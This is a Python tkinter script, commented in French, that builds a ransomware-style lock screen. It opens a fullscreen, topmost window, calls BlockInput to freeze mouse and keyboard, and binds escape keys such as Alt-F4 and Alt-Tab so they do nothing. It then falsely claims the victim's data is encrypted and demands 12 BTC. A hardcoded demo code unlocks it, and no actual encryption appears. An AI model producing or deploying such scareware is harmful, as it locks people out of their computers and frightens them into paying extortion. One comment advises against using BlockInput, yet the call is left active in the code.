import tkinter as tk
import ctypes
import ctypes.wintypes

# Blocage système de certaines touches (exclut Ctrl+Alt+Suppr)
user32 = ctypes.windll.user32
user32.BlockInput(True)   # Bloque toute entrée souris/clavier (ATTENTION : radical)
# Mais attention: BlockInput(True) peut rendre impossible même la saisie du code.
# Mieux vaut ne pas l'utiliser. On va plutôt bloquer des touches spécifiques.

# Alternative: installer un hook clavier (plus complexe). Pour rester simple,
# on va utiliser la méthode précédente + un message d'avertissement.

root = tk.Tk()
root.attributes('-fullscreen', True, '-topmost', True)
root.overrideredirect(True)
root.configure(bg='black')
root.grab_set()
root.focus_force()

def ignore(event):
    return 'break'

# Liste étendue des touches à bloquer
touches = [
    '<Alt-F4>', '<Escape>', '<Control-q>', '<Control-w>', '<Alt-Tab>',
    '<Control-Tab>', '<Control-Escape>', '<Alt-Escape>', '<Win_L>', '<Win_R>',
    '<Shift-Escape>', '<Control-Shift-Escape>', '<Alt-Delete>', '<Control-Delete>'
]
for t in touches:
    root.bind(t, ignore)

root.bind('<Button-3>', ignore)
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Message effrayant
tk.Label(root, text="💀 VOS DONNEES ONT ETE CHIFFRER 💀", font=("Arial",32,"bold"), fg="red", bg="black").pack(pady=20)
tk.Label(root, text="TOUTE TENTATIVE DE CONTOURNEMENT (Ctrl+Alt+Suppr, redémarrage)\n"
                    "ENTRAÎNERA LA PERTE DÉFINITIVE DE VOS DONNÉES.\n"
                    "VOUS DEVEZ PAYER 12 BTC A L'ADRESSE CI-DESSOUS POUR DÉBLOQUER LE CODE .\n\n"
                    ,
         font=("Arial",14), fg="white", bg="black").pack()
tk.Label(root, text="CODE D'ACCÈS :", font=("Arial",18,"bold"), fg="yellow", bg="black").pack(pady=15)

entry = tk.Entry(root, font=("Arial",24), justify='center', bg='gray20', fg='white')
entry.pack(pady=10)
entry.focus()

def valider():
    if entry.get() == "DEMO2026":
        for w in root.winfo_children():
            w.destroy()
        tk.Label(root, text="✅ DÉBLOQUÉ AVEC SUCCÈS ✅\nFermeture dans 3 secondes",
                 font=("Arial",24,"bold"), fg="lime", bg="black").pack(expand=True)
        root.after(3000, lambda: [root.grab_release(), root.destroy()])
    else:
        entry.delete(0, 'end')
        tk.Label(root, text="❌ CODE INCORRECT - ENCORE UNE ERREUR ET VOUS PERDEZ TOUS ! ", fg="red", bg="black").pack()

tk.Button(root, text="DÉBLOQUER", font=("Arial",20,"bold"), command=valider, bg="lime", width=20).pack(pady=15)
tk.Label(root, text="🔓  789bf0d234de0e8c78319c78ac1fe0485082b062f900322176f500c0c1c12ccc 🔓", font=("Courier",18,"bold"), fg="cyan", bg="black").pack(side="bottom", pady=20)

root.mainloop()

